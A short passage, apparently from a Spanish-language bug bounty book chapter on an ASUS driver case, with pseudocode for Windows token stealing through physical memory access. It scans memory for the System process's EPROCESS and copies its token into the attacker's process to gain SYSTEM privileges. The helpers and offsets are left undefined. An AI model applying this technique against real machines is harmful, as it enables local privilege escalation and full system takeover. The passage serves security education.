# Extraído de: LibroBugBounty/cap-22-caso-asus.md
# Pseudocodigo: token stealing via memoria fisica
# 1. Leer la direccion del kernel desde el IDT
idt_base = read_phys(IDTR_ADDRESS)

# 2. Escanear memoria fisica buscando EPROCESS de System (PID 4)
for addr in range(0, PHYSICAL_MEMORY_SIZE, PAGE_SIZE):
    data = read_phys(addr, 8)
    if is_eprocess_header(data):
        pid = read_phys(addr + EPROCESS_PID_OFFSET, 4)
        if pid == 4:  # System process
            system_token = read_phys(
                addr + EPROCESS_TOKEN_OFFSET, 8)
            break

# 3. Copiar token de System a nuestro proceso
our_eprocess = find_eprocess_by_pid(os.getpid())
write_phys(our_eprocess + EPROCESS_TOKEN_OFFSET, system_token)
# Ahora nuestro proceso tiene token de SYSTEM
